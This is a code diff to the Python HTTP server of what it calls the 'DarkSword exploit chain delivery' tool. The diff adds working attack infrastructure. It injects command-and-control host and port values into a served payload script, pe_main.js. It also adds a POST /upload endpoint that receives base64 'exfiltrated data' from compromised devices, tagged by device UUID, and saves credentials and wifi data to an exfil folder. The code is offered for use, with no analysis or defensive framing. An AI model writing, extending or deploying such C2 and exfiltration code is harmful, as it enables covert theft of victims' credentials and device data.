@@ -1,12 +1,17 @@
 """HTTP server for DarkSword exploit chain delivery."""
 
+import base64
+import json
 import re
+from datetime import datetime
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from pathlib import Path
 from urllib.parse import urlparse
 from typing import Optional
 
 from .config import get_payloads_dir, get_templates_dir, ServeConfig
+
+EXFIL_DIR: Optional[Path] = None
 
 
 class DarkSwordHandler(SimpleHTTPRequestHandler):
@@ -32,13 +37,50 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
         self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
         super().end_headers()
 
+    def _get_c2_host_port(self) -> tuple:
+        config = self.config or getattr(self, "config", None)
+        host = "localhost"
+        port = str(config.port) if config else "8080"
+        if config and config.custom_host_in_loader:
+            url = config.custom_host_in_loader
+            if "://" in url:
+                url = url.split("://", 1)[1]
+            if "/" in url:
+                url = url.split("/", 1)[0]
+            if ":" in url:
+                host, port = url.rsplit(":", 1)
+            else:
+                host = url
+        else:
+            host_header = self.headers.get("Host", "")
+            if ":" in host_header:
+                host, port = host_header.rsplit(":", 1)
+            else:
+                host = host_header
+        return host, port
+
+    def _inject_c2_into_pe_main(self, content: bytes, path: Path) -> bytes:
+        if path.name != "pe_main.js" or b"__DS_C2" not in content:
+            return content
+        config = self.config
+        if not config:
+            return content
+        host, port = self._get_c2_host_port()
+        content_str = content.decode("utf-8", errors="replace")
+        content_str = content_str.replace("__DS_C2_HOST__", host)
+        content_str = content_str.replace("__DS_C2_PORT__", port)
+        content_str = content_str.replace("__DS_C2_HTTPS__", "false")
+        return content_str.encode("utf-8")
+
     def serve_file(self, path: Path, content_type: str = "application/octet-stream") -> bool:
         """Serve a file with optional content type."""
         try:
             with open(path, "rb") as f:
                 content = f.read()
 
-            if self.config and self.config.custom_host_in_loader and path.suffix == ".js":
+            if path.name == "pe_main.js":
+                content = self._inject_c2_into_pe_main(content, path)
+            elif self.config and self.config.custom_host_in_loader and path.suffix == ".js":
                 content_str = content.decode("utf-8", errors="replace")
                 if "localHost" in content_str:
                     content_str = re.sub(
@@ -90,12 +132,43 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
         super().do_GET()
 
     def do_POST(self) -> None:
-        """Log POST requests (used by encrypted loader variants)."""
+        """Handle POST - /upload receives exfiltrated data from payload."""
         content_length = int(self.headers.get("Content-Length", 0))
         body = self.rfile.read(content_length) if content_length else b""
+        parsed = urlparse(self.path)
+        if parsed.path.strip("/") == "upload":
+            self._handle_upload(body)
+            return
         print(f"  [POST] {self.path} ({content_length} bytes)")
         self.send_response(404)
         self.end_headers()
+
+    def _handle_upload(self, body: bytes) -> None:
+        try:
+            data = json.loads(body.decode("utf-8"))
+            device = data.get("deviceUUID", "unknown")
+            category = data.get("category", "data")
+            path = data.get("path", "unknown")
+            desc = data.get("description", "")
+            b64 = data.get("data", "")
+            if b64:
+                raw = base64.b64decode(b64)
+                exfil_dir = EXFIL_DIR or (get_payloads_dir().parent / "exfil")
+                exfil_dir.mkdir(parents=True, exist_ok=True)
+                safe_device = re.sub(r'[^\w\-]', '_', device)[:64]
+                ext = ".txt" if "credential" in category.lower() or "wifi" in str(desc).lower() else ".bin"
+                fname = f"{safe_device}_{category}_{datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
+                out_path = exfil_dir / fname
+                out_path.write_bytes(raw)
+                print(f"  [EXFIL] {device} | {category} | {path} -> {out_path}")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(b'{"ok":true}')
+        except Exception as e:
+            print(f"  [UPLOAD ERROR] {e}")
+            self.send_response(500)
+            self.end_headers()
 
 
 def run_server(config: ServeConfig) -> None:
@@ -108,6 +181,8 @@ def run_server(config: ServeConfig) -> None:
     print(f"\n[*] DarkSword server listening on http://{config.host}:{config.port}")
     print(f"[*] Payloads: {get_payloads_dir()}")
     print(f"[*] Access: http://localhost:{config.port}/ or http://<IP>:{config.port}/")
+    exfil_dir = get_payloads_dir().parent / "exfil"
+    print(f"[*] Exfil data saved to: {exfil_dir}")
     print("\n[!] Press Ctrl+C to stop\n")
 
     try:
